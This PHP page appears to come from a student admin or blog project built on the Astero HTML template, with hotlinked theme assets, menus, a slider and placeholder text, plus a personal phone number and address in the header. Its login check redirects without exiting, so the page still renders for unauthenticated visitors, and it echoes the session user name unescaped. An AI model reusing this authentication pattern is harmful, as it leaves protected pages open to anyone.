<?php
include 'koneksi.php';
SESSION_START();
if(empty($_SESSION['status_login'])){
    header("location:login.php");
}
?>

<!DOCTYPE html>
<!--[if lt IE 7 ]> <html class="ie6"> <![endif]-->
<!--[if IE 7 ]>    <html class="ie7"> <![endif]-->
<!--[if IE 8 ]>    <html class="ie8"> <![endif]-->
<!--[if IE 9 ]>    <html class="ie9"> <![endif]-->
<!--[if (gt IE 9)|!(IE)]><!--><html lang="en" class=""><!--<![endif]-->
<head>
	<meta charset="utf-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <meta name="description" content="">
    <meta name="author" content="">

	<title>Astero</title>

	<!-- Standard Favicon -->
	<link rel="icon" type="image/x-icon" href="http://themesquared.com/html/astero/images/favicon.png" />
	
	<!-- For iPhone 4 Retina display: -->
	<link rel="apple-touch-icon-precomposed" sizes="114x114" href="http://themesquared.com/html/astero/images//apple-touch-icon-114x114-precomposed.png">
	
	<!-- For iPad: -->
	<link rel="apple-touch-icon-precomposed" sizes="72x72" href="http://themesquared.com/html/astero/images//apple-touch-icon-72x72-precomposed.png">
	
	<!-- For iPhone: -->
	<link rel="apple-touch-icon-precomposed" href="http://themesquared.com/html/astero/images//apple-touch-icon-57x57-precomposed.png">	
	
	<link rel="stylesheet" type="text/css" href="http://themesquared.com/html/astero/libraries/lightslider/lightslider.min.css" />
	
	<link rel="stylesheet" type="text/css" href="http://themesquared.com/html/astero/revolution/css/settings.css">

	<link href="https://technext.github.io/startbootstrap-sb-admin-2/vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
	
 
	<!-- RS5.0 Layers and Navigation Styles -->
	<link rel="stylesheet" type="text/css" href="http://themesquared.com/html/astero/revolution/css/layers.css">
	<link rel="stylesheet" type="text/css" href="http://themesquared.com/html/astero/revolution/css/navigation.css">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">

	<!-- Custom - Theme CSS -->
	<link rel="stylesheet" type="text/css" href="http://themesquared.com/html/astero/styles.css" />

	<!--[if lt IE 9]>
		<script src="js/html5/respond.min.js"></script>
    <![endif]-->
	
</head>

<body data-offset="200" data-spy="scroll" data-target=".ow-navigation">
<div class="main-box">
	<a id="top"></a>
	


	<!-- Header Section -->
	<header id="header" class="header-section header-section-1 container-fluid no-padding">
		<!-- Top Header -->
		<div class="top-header container-fluid no-padding">
			<!-- Container -->
			<div class="container">
				<p>
				<i class="glyphicon glyphicon-earphone">&nbsp;085314188808</i>
				 &nbsp;&nbsp;&nbsp;&nbsp; <i class="glyphicon glyphicon-user">&nbsp;Wahyu Safrizal</i>
				  &nbsp;&nbsp;&nbsp;&nbsp; <i class="glyphicon glyphicon-home">&nbsp;Villa Cilame Indah</i>
				 <span class="reg-link"><a href="" title="Sign In"></a> <?php echo $_SESSION['nama_user'] ?> <a href="logout.php" title="Register">Log Out</a></span></p>
			</div><!-- Container /- -->
		</div><!-- Top Header /- -->
	
		<!-- Menu Block -->
		<div class="container-fluid no-padding menu-block">
			<!-- Container -->
			<div class="container">
				<!-- nav -->
				<nav class="navbar navbar-default ow-navigation">
					<div class="navbar-header">
						<button aria-controls="navbar" aria-expanded="false" data-target="#navbar" data-toggle="collapse" class="navbar-toggle collapsed" type="button">
							<span class="sr-only">Toggle navigation</span>
							<span class="icon-bar"></span>
							<span class="icon-bar"></span>
							<span class="icon-bar"></span>
						</button>
						<a href="index.html" class="navbar-brand"><img src="http://themesquared.com/html/astero/images/logo.png" alt="Logo" />astero</a>
					</div>
					<!-- Menu Icon -->
					<div class="menu-icon">
						<div class="search">	
							<a href="#" id="search" title="Search"><i class="fa fa-search"></i></a>
						</div>
						<div class="cart">							
							<button aria-expanded="true" aria-haspopup="true" data-toggle="dropdown" title="Cart" id="language" type="button" class="btn dropdown-toggle">
								<i class="fa fa-shopping-cart"></i><span>2</span>
							</button>
							<ul class="dropdown-menu no-padding">
								<li class="mini_cart_item">
									<a href="#"><img width="70" height="70" alt="poster_2_up" class="attachment-shop_thumbnail" src="http://themesquared.com/html/astero/images/cart-placeholder.jpg"></a>
									<div class="cart-detail">
										<a href="#">product title <span>Category</span></a>
										<span class="quantity">1 × <span class="amount">$12,99</span></span>
									</div>
								</li>
								<li class="mini_cart_item">
									<a href="#"><img width="70" height="70" alt="poster_2_up" class="attachment-shop_thumbnail" src="http://themesquared.com/html/astero/images/cart-placeholder-2.jpg"></a>
									<div class="cart-detail">
										<a href="#">product title <span>Category</span></a>
										<span class="quantity">1 × <span class="amount">$12,99</span></span>
									</div>
								</li>
								<li class="subtotal">
									<h5>subtotal <span>$12,99</span></h5>
								</li>
								<li class="button">
									<a href="#" title="View Cart">View Cart</a>
									<a href="#" title="Check Out">Check out</a>
								</li>
							</ul>
						</div>
						<!--div class="burger-menu">
							<a href="#" title="menu"><img src="images/burger-menu-ic.png" alt="Menu" /></a>
						</div-->
					</div><!-- Menu Icon /- -->
					<div class="navbar-collapse collapse navbar-right" id="navbar">
						<ul class="nav navbar-nav">
							<li class="active dropdown mega-dropdown">
								<a href="#top" title="Home" class="dropdown-toggle" role="button" aria-haspopup="true" aria-expanded="false">Home</a>
								<i class="ddl-switch fa fa-angle-down"></i>
								<ul class="dropdown-menu mega-menu">
									<li class="col-md-3">
										
									<li><a href="artikel.php">Input Artikel</a></li>
									<li><a href="kategori.php">Input Kategori</a></li>
								
		
									</li>
								</ul>
							</li>
							<li class="dropdown">
								<a href="#" title="Pages" class="dropdown-toggle" role="button" aria-haspopup="true" aria-expanded="false">Pages</a>
								<i class="ddl-switch fa fa-angle-down"></i>
								<ul class="dropdown-menu">
									<li><a href="http://themesquared.com/html/astero/021_about.html">About</a></li>
									<li><a href="http://themesquared.com/html/astero/022_team.html">Team</a></li>
									<li><a href="artikel.php">Input Artikel</a></li>
									<li><a href="kategori.php">Input Kategori</a></li>
									<li><a href="http://themesquared.com/html/astero/118_error.html">404</a></li>
									<li><a href="http://themesquared.com/html/astero/119_offline.html">Under construction</a></li>
									<li><a href="http://themesquared.com/html/astero/120_comingsoon.html">Comingsoon</a></li>
								</ul>
							</li>
							<li class="dropdown mega-dropdown">
								<a href="#" title="Portfolio" class="dropdown-toggle" role="button" aria-haspopup="true" aria-expanded="false">Portfolio</a>
								<i class="ddl-switch fa fa-angle-down"></i>
								<ul class="dropdown-menu mega-menu">
									<li class="col-md-4">
										<div class="dropdown-box">
											<h4>boxed</h4>
											<ul>
												<li><a href="http://themesquared.com/html/astero/033_portfolio_boxed_3_columns_nospace.html" title="boxed 3 columnsnospace">Boxed 3 columnsnospace</a></li>
												<li><a href="http://themesquared.com/html/astero/034_portfolio_boxed_4_columns_nospace.html" title="boxed 4 columnsnospace">Boxed 4 columnsnospace</a></li>
												<li><a href="http://themesquared.com/html/astero/035_portfolio_boxed_5_columns_nospace.html" title="Boxed 5 columnsnospace">Boxed 5 columnsnospace</a></li>
												<li><a href="http://themesquared.com/html/astero/036_portfolio_boxed_3_columns.html" title="Boxed 3 columns">Boxed 3 columns</a></li>
												<li><a href="http://themesquared.com/html/astero/037_portfolio_boxed_4_columns.html" title="Boxed 4 columns">Boxed 4 columns</a></li>
												<li><a href="http://themesquared.com/html/astero/038_portfolio_boxed_5_columns.html" title="Boxed 5 columns">Boxed 5 columns</a></li>
												<li><a href="http://themesquared.com/html/astero/039_portfolio_boxed_masonry.html" title="boxed masonry">Boxed masonry</a></li>
												<li><a href="http://themesquared.com/html/astero/040_portfolio_boxed_mosaic.html" title="boxed Mosaic">Boxed Mosaic</a></li>
											</ul>
										</div>
									</li>
									<li class="col-md-4">
										<div class="dropdown-box">
											<h4>full width</h4>
											<ul>
												<li><a href="http://themesquared.com/html/astero/041_portfolio_fullwith_3_columns_nospace.html" title="fullwidth 3 columnsnospace">fullwidth 3 columnsnospace</a></li>
												<li><a href="http://themesquared.com/html/astero/042_portfolio_fullwith_4_columns_nospace.html" title="fullwidth 4 columnsnospace">fullwidth 4 columnsnospace</a></li>
												<li><a href="http://themesquared.com/html/astero/043_portfolio_fullwidth_5_columns_nospace.html" title="fulwidth 5 columns nospace">Fulwidth 5 columns nospace</a></li>
												<li><a href="http://themesquared.com/html/astero/044_portfolio_fullwidth_3_columns.html" title="fullwidth 3 columns space">Fullwidth 3 columns</a></li>
												<li><a href="http://themesquared.com/html/astero/045_portfolio_fullwith_4_columns.html" title="Fullwidth 4 columns">Fullwidth 4 columns</a></li>
												<li><a href="http://themesquared.com/html/astero/046_portfolio_fullwidth_5_columns.html" title="fulwidth 5 columns">Fullwidth 5 columns</a></li>
												<li><a href="http://themesquared.com/html/astero/047_portfolio_fullwidth_masonry.html" title="Fulwidth masonry">Fullwidth masonry</a></li>
												<li><a href="http://themesquared.com/html/astero/048_portfolio_fullwidth_mosaic.html" title="Fulwidth masonry">Fullwidth Mosaic</a></li>
											</ul>
										</div>
									</li>
									<li class="col-md-4">
										<div class="dropdown-box">
											<h4>single project</h4>
											<ul>
												<li><a href="http://themesquared.com/html/astero/049_portfolio_singleproject_horizontal_carousel.html" title="Single Portfolio 1">Single Portfolio 1</a></li>
												<li><a href="http://themesquared.com/html/astero/050_portfolio_singleproject_flow_carousel.html" title="Single Portfolio 2">Single Portfolio 2</a></li>
												<li><a href="http://themesquared.com/html/astero/051_portfolio_singleproject_sidebar_slider.html" title="Single Portfolio 3">Single Portfolio 3</a></li>
												<li><a href="http://themesquared.com/html/astero/052_portfolio_singleproject_project_gallery.html" title="Single Portfolio 4">Single Portfolio 4</a></li>
												<li><a href="http://themesquared.com/html/astero/053_portfolio_singleproject_right_fixed_slider.html" title="Single Portfolio 5">Single Portfolio 5</a></li>
												<li><a href="http://themesquared.com/html/astero/054_portfolio_singleproject_left_fixed_slider.html" title="Single Portfolio 6">Single Portfolio 6</a></li>
												<li><a href="http://themesquared.com/html/astero/055_portfolio_singleproject_custom.html" title="Single Portfolio 7">Single Portfolio 7</a></li>
											</ul>
										</div>
									</li>
								</ul>
							</li>
							<li class="dropdown">
								<a href="#" title="Blog" class="dropdown-toggle" role="button" aria-haspopup="true" aria-expanded="false">Blog</a>
								<i class="ddl-switch fa fa-angle-down"></i>
								<ul class="dropdown-menu">
									<li><a href="http://themesquared.com/html/astero/025_blog_fullwidth.html" title="Large Images">Large Images</a></li>
									<li><a href="http://themesquared.com/html/astero/026_blog_sidebar.html" title="Large images with Sidebar">Large images with Sidebar</a></li> 
									<li><a href="http://themesquared.com/html/astero/027_blog_masonry.html" title="Masonry">Masonry</a></li> 
									<li><a href="http://themesquared.com/html/astero/028_blog_fullwidth_2_columns.html" title="Fullwidth 2 Columns">Fullwidth 2 Columns</a></li> 
									<li><a href="http://themesquared.com/html/astero/029_blog_fullwidth_3_columns.html" title="Fullwidth 3 Columns">Fullwidth 3 Columns</a></li> 
									<li><a href="http://themesquared.com/html/astero/030_blog_fullwidth_custom.html" title="Fullwidth Custom">Fullwidth Custom</a></li> 
									<li><a href="http://themesquared.com/html/astero/031_blog_singlepost_sidebar.html" title="Single Post">Single Post</a></li> 
									<li><a href="http://themesquared.com/html/astero/032_blog_singlepost_fullwidth.html" title="Single Post Fullwidth">Single Post Fullwidth</a></li> 
								</ul>
							</li>
							<li class="dropdown">
								<a href="#" title="Shop" class="dropdown-toggle" role="button" aria-haspopup="true" aria-expanded="false">Store</a>
								<i class="ddl-switch fa fa-angle-down"></i>
								<ul class="dropdown-menu">
									<li><a href="http://themesquared.com/html/astero/056_store_fullwidth.html">Store Fullwidth</a></li>
									<li><a href="http://themesquared.com/html/astero/057_store_sidebar.html">Store Sidebar</a></li>
									<li><a href="http://themesquared.com/html/astero/058_store_singleproduct.html">Single Product</a></li>
									<li><a href="http://themesquared.com/html/astero/059_store_cart.html">Cart</a></li>
									<li><a href="http://themesquared.com/html/astero/060_store_checkout.html">Checkout</a></li>
									<li><a href="http://themesquared.com/html/astero/061_store_wishlist.html">Wishlist</a></li>
									<li><a href="http://themesquared.com/html/astero/062_store_account.html">Account</a></li>
								</ul>
							</li>
							<li class="dropdown mega-dropdown">
								<a href="#" title="Elements" class="dropdown-toggle" role="button" aria-haspopup="true" aria-expanded="false">Elements</a>
								<i class="ddl-switch fa fa-angle-down"></i>
								<ul class="dropdown-menu mega-menu">
									<li class="col-md-3">
										<div class="dropdown-box">
											<ul>
												<li><a href="http://themesquared.com/html/astero/066_elements_accordion.html">Accordion</a></li>
												<li><a href="http://themesquared.com/html/astero/067_elements_alerts.html">Alerts</a></li>
												<li><a href="http://themesquared.com/html/astero/068_elements_blockquotes.html">Blockquotes</a></li>
												<li><a href="http://themesquared.com/html/astero/069_elements_border_holder.html">Border Holder</a></li>
												<li><a href="http://themesquared.com/html/astero/070_elements_buttons.html">Buttons</a></li>
												<li><a href="http://themesquared.com/html/astero/071_elements_calltoaction.html">Call To Action</a></li>
												<li><a href="http://themesquared.com/html/astero/072_elements_clients.html">Clients</a></li>
												<li><a href="http://themesquared.com/html/astero/073_elements_columns.html">columns</a></li>
												<li><a href="http://themesquared.com/html/astero/074_elements_consealandreveal.html">consealandreveal</a></li>
												<li><a href="http://themesquared.com/html/astero/075_elements_contactform.html">Contact Forms</a></li>
												<li><a href="http://themesquared.com/html/astero/076_elements_content_slider.html">Content Slider</a></li>
												<li><a href="http://themesquared.com/html/astero/077_elements_counters.html">Counters</a></li>
												<li><a href="http://themesquared.com/html/astero/078_elements_cover_boxes.html">Cover Box</a></li>
											</ul>
										</div>
									</li>
									<li class="col-md-3">
										<div class="dropdown-box">
											<ul>
												<li><a href="http://themesquared.com/html/astero/079_elements_doughnut_pie_chart.html">Doughnut pie Chart</a></li>
												<li><a href="http://themesquared.com/html/astero/080_elements_dropcaps.html">Dropcaps</a></li>
												<li><a href="http://themesquared.com/html/astero/081_elements_expandable_sections.html">Expandable Sections</a></li>
												<li><a href="http://themesquared.com/html/astero/082_elements_full_pie_chart.html">Full Pie Charts</a></li>
												<li><a href="http://themesquared.com/html/astero/083_elements_headings.html">Headings</a></li>
												<li><a href="http://themesquared.com/html/astero/084_elements_highlights.html">Highlights</a></li>
												<li><a href="http://themesquared.com/html/astero/085_elements_horizontal_progress_bar.html">Horizontal Progress Bar</a></li>
												<li><a href="http://themesquared.com/html/astero/086_elements_hovered_styles.html">Hovered Styles</a></li>
												<li><a href="http://themesquared.com/html/astero/087_elements_icon_pie_chart.html">Icon Piecharts</a></li>
												<li><a href="http://themesquared.com/html/astero/088_elements_icon_teaser.html">teaser</a></li>
												<li><a href="http://themesquared.com/html/astero/089_elements_image_banners.html">Image Banners</a></li>
												<li><a href="http://themesquared.com/html/astero/090_elements_info_box.html">Info Box</a></li>
												<li><a href="http://themesquared.com/html/astero/091_elements_interactive_banners.html">Interractive Banners</a></li>
											</ul>
										</div>
									</li>
									<li class="col-md-3">
										<div class="dropdown-box">
											<ul>
												<li><a href="http://themesquared.com/html/astero/092_elements_lists_style.html">List style</a></li>
												<li><a href="http://themesquared.com/html/astero/093_elements_messagebox.html">Messagebox</a></li>
												<li><a href="http://themesquared.com/html/astero/094_elements_numbered_images.html">Number Image</a></li>
												<li><a href="http://themesquared.com/html/astero/095_elements_pie_chart.html">Pie chart</a></li>
												<li><a href="http://themesquared.com/html/astero/096_elements_pricing_tables.html">Pricing Tables</a></li>
												<li><a href="http://themesquared.com/html/astero/097_elements_process.html">Process</a></li>
												<li><a href="http://themesquared.com/html/astero/098_elements_ribbon_holder.html">Ribbon Holder</a></li>
												<li><a href="http://themesquared.com/html/astero/099_elements_separators.html">Separators</a></li>
												<li><a href="http://themesquared.com/html/astero/100_elements_service_tables.html">Service Tables</a></li>
												<li><a href="http://themesquared.com/html/astero/101_elements_socialicons.html">Socialicons</a></li>
												<li><a href="http://themesquared.com/html/astero/102_elements_tabs.html">Tabs</a></li>
												<li><a href="http://themesquared.com/html/astero/103_elements_team.html">Team</a></li>
												<li><a href="http://themesquared.com/html/astero/104_elements_testimonials.html">Testimonials</a></li>
											</ul>
										</div>
									</li>
									<li class="col-md-3">
										<div class="dropdown-box">
											<ul>
												<li><a href="http://themesquared.com/html/astero/105_elements_vertical_progress_bar.html">Vertical Progress bar</a></li>
												<li><a href="http://themesquared.com/html/astero/106_elements_videopresentation.html">Video Presentation</a></li>
												<li><a href="http://themesquared.com/html/astero/107_elements_carousel.html">carousel</a></li>
												<li><a href="http://themesquared.com/html/astero/108_elements_googlemap.html">googlemap</a></li>
												<li><a href="http://themesquared.com/html/astero/109_elements_icon_progress_bars.html">Progress Bars</a></li>
												<li><a href="http://themesquared.com/html/astero/110_elements_gallery_grayscale.html">gallery grayscale</a></li>
												<li><a href="http://themesquared.com/html/astero/111_elements_image_gallery.html">image gallery</a></li>
												<li><a href="http://themesquared.com/html/astero/112_elements_expandable_sections_with_background.html">Expandable Sections background</a></li>
												<li><a href="http://themesquared.com/html/astero/113_elements_tables.html">Tables</a></li>
												<li><a href="http://themesquared.com/html/astero/114_elements_image_slider.html">image slider</a></li>
												<li><a href="http://themesquared.com/html/astero/115_elements_color_schemes.html">color schemes</a></li>
												<li><a href="http://themesquared.com/html/astero/116_elements_pagination.html">pagination</a></li>
												<li><a href="http://themesquared.com/html/astero/117_elements_popup.html">popup</a></li>
											</ul>
										</div>
									</li>
								</ul>
							</li>
							<li class="dropdown">
								<a href="#" title="Shop" class="dropdown-toggle" role="button" aria-haspopup="true" aria-expanded="false">Contacts</a>
								<i class="ddl-switch fa fa-angle-down"></i>
								<ul class="dropdown-menu">
									<li><a href="http://themesquared.com/html/astero/063_contact1.html">contact us 1</a></li>
									<li><a href="http://themesquared.com/html/astero/064_contact2.html">contact us 2</a></li>
									<li><a href="http://themesquared.com/html/astero/065_contact3.html">contact us 3</a></li>
								</ul>
							</li>
						</ul>
					</div><!--/.nav-collapse -->
				</nav><!-- nav /- -->
				<!-- Search Box -->
				<div class="search-box">
					<span><i class="icon_close"></i></span>
					<form><input type="text" class="form-control" placeholder="Enter a keyword and press enter..." /></form>
				</div><!-- Search Box /- -->
			</div><!-- Container /- -->
		</div><!-- Menu Block /- -->
		
	</header><!-- Header Section /- -->
	<main>
		<!-- Slider Section -->
		<div id="home-revslider" class="homeslider-section-1 container-fluid no-padding ">
			<!-- START REVOLUTION SLIDER 5.0 -->
			<div class="rev_slider_wrapper">
				<div id="home-slider1" class="rev_slider" data-version="5.0">
					<ul> 
						<li data-transition="fade" data-slotamount="1"  data-easein="default" data-easeout="default" data-masterspeed="1500"> 
							<!-- MAIN IMAGE -->
							<img src="http://themesquared.com/html/astero/images/home-slider/home1.jpg" alt="home1"  width="1920" height="983"> 
							
							<!-- LAYER NR. 1 -->
							<div class="tp-caption NotGeneric-Title tp-resizeme rs-parallaxlevel-0" id="slide-1-layer-1" 
								data-x="['left','left','left','left']" data-hoffset="['380','380','380','380']" 
								data-y="['top','top','top','top']"  data-voffset="['390','390','390','390']" 
								data-fontsize="['180','180','180','180']"
								data-lineheight="['120','120','120','120']"
								data-width="none"
								data-height="none"
								data-whitespace="nowrap"
								data-transform_idle="o:1;"
								data-transform_in="x:[105%];z:0;rX:45deg;rY:0deg;rZ:90deg;sX:1;sY:1;skX:0;skY:0;s:2000;e:Power4.easeInOut;" 
								data-transform_out="y:[100%];s:1000;e:Power2.easeInOut;s:1000;e:Power2.easeInOut;" 
								data-mask_in="x:0px;y:0px;s:inherit;e:inherit;" 
								data-mask_out="x:inherit;y:inherit;s:inherit;e:inherit;" 
								data-start="1000" 
								data-splitin="chars" 
								data-splitout="none" 
								data-responsive_offset="on"
								data-elementdelay="0.05"							
								style="z-index:6; position:relative; color:#fff; font-weight:700; letter-spacing:0; font-family: 'Montserrat', sans-serif; text-transform: uppercase;">ASTERO
							</div>

							<!-- LAYER NR. 2 -->
							<div class="tp-caption NotGeneric-SubTitle tp-resizeme rs-parallaxlevel-0"
								id="slide-1-layer-2" 
								data-x="['right','right','right','right']" data-hoffset="['490','490','490','490']" 
								data-y="['top','top','top','top']" data-voffset="['580','580','580','580']" 
								data-fontsize="['32','32','32','32']"
								data-lineheight="['30','30','30','30']"
								data-width="auto"
								data-height="none"
								data-whitespace="noraml"
								data-transform_idle="o:1;"
								data-transform_in="y:[100%];z:0;rX:0deg;rY:0;rZ:0;sX:1;sY:1;skX:0;skY:0;opacity:0;s:2000;e:Power4.easeInOut;" 
								data-transform_out="y:[100%];s:1000;e:Power2.easeInOut;s:1000;e:Power2.easeInOut;" 
								data-mask_in="x:0px;y:[100%];s:inherit;e:inherit;" 
								data-mask_out="x:inherit;y:inherit;s:inherit;e:inherit;" 
								data-start="1500" 
								data-splitin="none" 
								data-splitout="none"							
								data-responsive_offset="on"	
								style="z-index: 6; position:relative; font-family: 'Montserrat', sans-serif; text-transform: uppercase; font-weight: bold; color: #d49d19; letter-spacing:0;">multi-concept HTML Template
							</div>
						</li>
						<li data-transition="fade" data-slotamount="1"  data-easein="default" data-easeout="default" data-masterspeed="1500"> 
							<!-- MAIN IMAGE -->
							<img src="http://themesquared.com/html/astero/images/home-slider/home7.jpg" alt="home1"  width="1920" height="983"> 
							
							<!-- LAYER NR. 1 -->
							<div class="tp-caption NotGeneric-Title tp-resizeme rs-parallaxlevel-0" id="slide-2-layer-1" 
								data-x="['left','left','left','left']" data-hoffset="['380','380','380','380']" 
								data-y="['top','top','top','top']"  data-voffset="['390','390','390','390']" 
								data-fontsize="['180','180','180','180']"
								data-lineheight="['120','120','120','120']"
								data-width="none"
								data-height="none"
								data-whitespace="nowrap"
								data-transform_idle="o:1;"
								data-transform_in="x:[105%];z:0;rX:45deg;rY:0deg;rZ:90deg;sX:1;sY:1;skX:0;skY:0;s:2000;e:Power4.easeInOut;" 
								data-transform_out="y:[100%];s:1000;e:Power2.easeInOut;s:1000;e:Power2.easeInOut;" 
								data-mask_in="x:0px;y:0px;s:inherit;e:inherit;" 
								data-mask_out="x:inherit;y:inherit;s:inherit;e:inherit;" 
								data-start="1000" 
								data-splitin="chars" 
								data-splitout="none" 
								data-responsive_offset="on"
								data-elementdelay="0.05"							
								style="z-index:6; position:relative; color:#fff; font-weight:700; letter-spacing:0; font-family: 'Montserrat', sans-serif; text-transform: uppercase;">Amazing
							</div>

							<!-- LAYER NR. 2 -->
							<div class="tp-caption NotGeneric-SubTitle tp-resizeme rs-parallaxlevel-0"
								id="slide-2-layer-2" 
								data-x="['right','right','right','right']" data-hoffset="['490','490','490','490']" 
								data-y="['top','top','top','top']" data-voffset="['580','580','580','580']" 
								data-fontsize="['32','32','32','32']"
								data-lineheight="['30','30','30','30']"
								data-width="auto"
								data-height="none"
								data-whitespace="noraml"
								data-transform_idle="o:1;"
								data-transform_in="y:[100%];z:0;rX:0deg;rY:0;rZ:0;sX:1;sY:1;skX:0;skY:0;opacity:0;s:2000;e:Power4.easeInOut;" 
								data-transform_out="y:[100%];s:1000;e:Power2.easeInOut;s:1000;e:Power2.easeInOut;" 
								data-mask_in="x:0px;y:[100%];s:inherit;e:inherit;" 
								data-mask_out="x:inherit;y:inherit;s:inherit;e:inherit;" 
								data-start="1500" 
								data-splitin="none" 
								data-splitout="none"							
								data-responsive_offset="on"	
								style="z-index: 6; position:relative; font-family: 'Montserrat', sans-serif; text-transform: uppercase; font-weight: bold; color: #d49d19; letter-spacing:0;">Features & possibilities
							</div>
						</li>
					</ul>
				</div><!-- END REVOLUTION SLIDER -->
			</div><!-- END OF SLIDER WRAPPER -->
		</div><!-- Slider Section /- -->
		<div class="padding-100"></div>
		<!-- Process Section /- -->
		<div class="process-section process-style-2 home1-process-section container-fluid no-padding">
			<div class="container">
				<!-- Row -->
				<div class="row">
					<div class="col-md-3 col-sm-6 col-xs-6">
						<div class="process-box">
							<i class="fa fa-heart-o" aria-hidden="true"></i>
							<h3>sounded</h3>
							<p>However, I travelled along the shore of the sea towards the east, I suppose about twelve miles.</p>
						</div>
					</div>
					<div class="col-md-3 col-sm-6 col-xs-6">
						<div class="process-box">
							<i class="fa fa-sliders" aria-hidden="true"></i>
							<h3>Looking</h3>
							<p>Looking cautiously round, to ascertain that they were not overheard</p>
						</div>
					</div>
					<div class="col-md-3 col-sm-6 col-xs-6">
						<div class="process-box">
							<i class="fa fa-folder-o" aria-hidden="true"></i>
							<h3>wondered</h3>
							<p>Travelled along the shore of the sea towards the east, I suppose about twelve miles.</p>
						</div>
					</div>
					<div class="col-md-3 col-sm-6 col-xs-6">
						<div class="process-box">
							<i class="fa fa-newspaper-o" aria-hidden="true"></i>
							<h3>therefore</h3>
							<p>Now the races of these two have been for some ages utterly extinct</p>
						</div>
					</div>
					<div class="col-md-3 col-sm-6 col-xs-6">
						<div class="process-box">
							<i class="fa fa-bell-o" aria-hidden="true"></i>
							<h3>nonsense</h3>
							<p>In all revolutions of government, he would make his court for the office</p>
						</div>
					</div>
					<div class="col-md-3 col-sm-6 col-xs-6">
						<div class="process-box">
							<i class="fa fa-bookmark-o" aria-hidden="true"></i>
							<h3>cautiously</h3>
							<p>I travelled along the shore of the sea towards the east, I suppose about twelve miles.</p>
						</div>
					</div>
					<div class="col-md-3 col-sm-6 col-xs-6">
						<div class="process-box">
							<i class="fa fa-code" aria-hidden="true"></i>
							<h3>clutched</h3>
							<p>In all revolutions of government, he would make his court for the office of hangman-general</p>
						</div>
					</div>
					<div class="col-md-3 col-sm-6 col-xs-6">
						<div class="process-box">
							<i class="fa fa-envelope-o" aria-hidden="true"></i>
							<h3>government</h3>
							<p>Along However, I travelled the shore of the sea towards the east.</p>
						</div>
					</div>
				</div><!-- Row /- -->
			</div><!-- Container -->
			<div class="padding-30"></div>
		</div><!-- Process Section /- -->
		
		<!-- Features Section -->
		<div class="features-section container-fluid no-padding">
			<!-- Container -->
			<div class="container">
				<!-- Row -->
				<div class="row">
					<div class="col-md-6">
						<div class="col-md-12 col-sm-12 col-xs-12 no-padding"><div class="fetures-img-block"><img src="http://themesquared.com/html/astero/images/home/feature1-1.jpg" href="images/home/feature1-1.jpg" alt="Features" /></div></div>
						<div class="col-md-12 col-sm-12 col-xs-12 no-padding"><div class="fetures-img-block"><img src="http://themesquared.com/html/astero/images/home/feature1-2.jpg" href="images/home/feature1-2.jpg" alt="Features" /></div></div>
					</div>
					<div class="col-md-6 col-sm-12 col-xs-12 no-padding">
						<div class="dropcaps-box col-md-12 col-sm-12 col-xs-12">
							<div class="dropcaps-content">
								<p><span class="square-bg">D</span>at first, for some time, I was not able to answer him one word; but as he had taken me in his arms I held fast by him, or I should have fallen to the ground. I confess this side of the country least inclination to remove, for as I was fixed in my habitation it became natural to me, and I seemed all the while I was here to be as it were upon a journey, and from home.</p>
								<p>Looking cautiously round, to ascertain that they were not overheard, the two hags cowered nearer to the fire, and chuckled heartily.</p>
							</div>
							<div class="padding-50"></div>
						</div>
						<!-- Icon Teaser -->
						<div class="icon-teaser icon-teaser-style-4 col-md-12 col-sm-12 col-xs-12 no-padding">
							<div class="col-md-6 col-sm-6 col-xs-6">
								<div class="icon-teaser-box">
									<h3><i class="fa fa-sliders" aria-hidden="true"></i>Smooth Parallax</h3>
									<p>She was bouncing away, when a cry from the two women, who had turned towards the bed, caused her to look round.</p>
								</div>
							</div>
							<div class="col-md-6 col-sm-6 col-xs-6">
								<div class="icon-teaser-box">
									<h3><i class="fa fa-life-ring" aria-hidden="true"></i>Inovate design</h3>
									<p>However, I travelled along the shore of the sea towards the east, I suppose about twelve.</p>
								</div>
							</div>
						</div><!-- Icon Teaser /- -->
					</div>
				</div><!-- Row /- -->
			</div><!-- Container /- -->
		</div><!-- Features Section /- -->
		<div class="padding-100"></div>
		<!-- Expandable Background 4 -->
		<div id="expandablestyle-4" class="expandable-style expandable-style-4 container-fluid no-padding">
			<div class="panel-group" id="accordion4_4" role="tablist" aria-multiselectable="true">
				<div class="panel panel-default" data-image="http://themesquared.com/html/astero/images/expandables/expandables-1.jpg">
					<!-- Container -->
					<div class="container">
						<div class="panel-heading" role="tab" id="headingFoure1">
							<h4 class="panel-title">
								<a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion4_4" href="#collapseFoure1" aria-expanded="false">So saying he unbuckled</a>
							</h4>
						</div>
						<div id="collapseFoure1" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingFoure1">
							<div class="panel-body">
								To these in the morning I sent the captain, who was to enter into a parley with them; in a word, to try them, and tell me whether he thought they might be trusted or not to go on board and surprise the ship.
							</div>
						</div>
					</div><!-- Container /- -->
				</div>
				<div class="panel panel-default" data-image="http://themesquared.com/html/astero/images/expandables/expandables-4.jpg">
					<!-- Container -->
					<div class="container">
						<div class="panel-heading" role="tab" id="headingFoure2">
							<h4 class="panel-title">
								<a role="button" data-toggle="collapse" data-parent="#accordion4_4" href="#collapseFoure2" aria-expanded="true">I had a great mind to bring it home</a>
							</h4>
						</div>
						<div id="collapseFoure2" class="panel-collapse collapse in" role="tabpanel" aria-labelledby="headingFoure2">
							<div class="panel-body">
								To these in the morning I sent the captain, who was to enter into a parley with them; in a word, to try them, and tell me whether he thought they might be trusted or not to go on board and surprise the ship.
							</div>
						</div>
					</div><!-- Container /- -->
				</div>
				<div class="panel panel-default" data-image="images/expandables/expandables-5.jpg">
					<!-- Container -->
					<div class="container">
						<div class="panel-heading" role="tab" id="headingFoure3">
							<h4 class="panel-title">
								<a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion4_4" href="#collapseFoure3" aria-expanded="false">She gave my mother such a turn</a>
							</h4>
						</div>
						<div id="collapseFoure3" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingFoure3">
							<div class="panel-body">
								To these in the morning I sent the captain, who was to enter into a parley with them; in a word, to try them, and tell me whether he thought they might be trusted or not to go on board and surprise the ship.
							</div>
						</div>
					</div><!-- Container /- -->
				</div>
			</div>
